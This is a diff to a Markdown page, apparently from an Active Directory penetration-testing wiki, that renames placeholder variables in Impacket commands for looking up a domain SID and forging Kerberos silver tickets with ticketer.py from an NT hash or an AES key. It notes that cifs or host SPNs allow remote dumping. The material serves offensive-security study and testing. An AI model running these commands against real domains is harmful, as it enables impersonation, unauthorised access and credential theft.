@@ -26,13 +26,13 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](htt
 
 ```bash
 # Find the domain SID
-lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
+lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$DC_HOST" 0
 
 # with an NT hash
-python ticketer.py -nthash "$NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "$SPN" "username"
+python ticketer.py -nthash "$NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "$SPN" "$USER"
 
 # with an AES (128 or 256 bits) key
-python ticketer.py -aesKey "$AESkey" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "$SPN" "username"
+python ticketer.py -aesKey "$AES_KEY" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "$SPN" "$USER"
 ```
 
 The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)).
